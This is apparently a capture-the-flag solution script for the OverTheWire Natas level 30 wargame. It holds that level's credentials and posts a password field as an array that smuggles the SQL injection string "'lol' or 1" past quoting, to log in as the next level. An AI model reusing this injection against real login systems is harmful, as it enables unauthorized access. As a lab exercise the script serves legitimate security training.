import requests
from requests.auth import HTTPBasicAuth
import time
import urllib.parse
import string
ps30 = 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH'
user = 'natas30'
basicAuth=HTTPBasicAuth(user,ps30)
url= "http://natas30.natas.labs.overthewire.org/" 
atm = {"username": "natas31", "password": ["'lol' or 1", 4]} #lol can be anything
r = requests.post(url,  data=atm, auth=basicAuth)
print(r.text)